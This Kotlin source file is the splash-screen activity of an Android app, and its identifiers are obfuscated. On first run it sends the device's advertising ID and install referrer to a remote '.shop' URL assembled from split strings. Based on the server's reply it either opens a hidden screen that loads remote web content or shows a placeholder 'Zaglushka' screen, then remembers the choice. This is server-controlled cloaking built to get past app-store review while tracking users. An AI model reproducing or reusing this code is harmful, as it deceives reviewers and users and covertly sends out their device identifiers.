package com.elisym.bigtise.elysiumrise.topic.handful.qwqwq

import android.annotation.SuppressLint
import android.app.Activity
import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.os.Bundle
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.lifecycle.lifecycleScope
import com.elisym.bigtise.elysiumrise.R
import com.elisym.bigtise.elysiumrise.ZaglushkaActivity
import com.elisym.bigtise.elysiumrise.topic.handful.qwqwq.FIJwfwhquwiuqwu.Companion.li
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.Response

@SuppressLint("CustomSplashScreen")
class SplashScreenActivity : AppCompatActivity() {
    private val PREFS_NAME = "MyPrefsFile"
    private val KEY_FIRST_ACTIVITY = "firstActivity"
    val nk2 = ".shop/Y7PNY8"

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        val urld = IJFhuwguwurwr(this@SplashScreenActivity)
        val sharedPreferences = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)

        if (!sharedPreferences.contains(KEY_FIRST_ACTIVITY)) {

            lifecycleScope.launch {
                urld.getDeepLinkAndAdvertisingId().collect { (deepLink, advertisingId, ins) ->
                    val url = if (ins.isNullOrBlank()) {
                        "$li$nk2?c=$deepLink&ad=$advertisingId"
                    } else {
                        "$li$nk2?c=$ins&ad=$advertisingId"
                    }
                     when (fjiwqhuqwrhir(url)) {
                        200 -> {
                            withContext(Dispatchers.Main){
                                saveFirstActivity(sharedPreferences, HUIfuiwqgyqriwqur::class.java)
                            }
                            val intent = Intent(this@SplashScreenActivity, HUIfuiwqgyqriwqur::class.java)
                            intent.putExtra("LLL_EXTRA", url)
                            startActivity(intent)
                            finish()
                        }

                        404 -> {
                            withContext(Dispatchers.Main){
                                saveFirstActivity(sharedPreferences, ZaglushkaActivity::class.java)
                            }
                            val intent =
                                Intent(this@SplashScreenActivity, ZaglushkaActivity::class.java)
                            startActivity(intent)
                            finish()
                        }
                    }
                }
            }
        }
        else {
            val fhuquwhuqwururw = fiqwirhuwqhuruwr(sharedPreferences)
            val huqwfuqwruqwhru = Intent(this@SplashScreenActivity, fhuquwhuqwururw)
            startActivity(huqwfuqwruqwhru)
            finish()
        }
        }

    suspend fun fjiwqhuqwrhir(url: String): Int {
            val fhqwufqiwihiruw = OkHttpClient()
            val fhqwfqwfiquwfu = Request.Builder()
                .url(url)
                .build()
            return try {
                withContext(Dispatchers.IO) {
                    val response: Response = fhqwufqiwihiruw.newCall(fhqwfqwfiquwfu).execute()
                    response.code

                }
            } catch (e: Exception) {
                -1
            }
    }

    private fun saveFirstActivity(sharedPreferences: SharedPreferences, activityClass: Class<*>) {
        val qwijjriwqjirjirw = sharedPreferences.edit()
        qwijjriwqjirjirw.putString(KEY_FIRST_ACTIVITY, activityClass.name)
        qwijjriwqjirjirw.apply()
    }

    private fun fiqwirhuwqhuruwr(sharedPreferences: SharedPreferences): Class<out Activity>? {
        val activityName = sharedPreferences.getString(KEY_FIRST_ACTIVITY, null)
        return try {
            activityName?.let { Class.forName(it).asSubclass(Activity::class.java) }
        } catch (e: ClassNotFoundException) {
            null
        }
    }

}
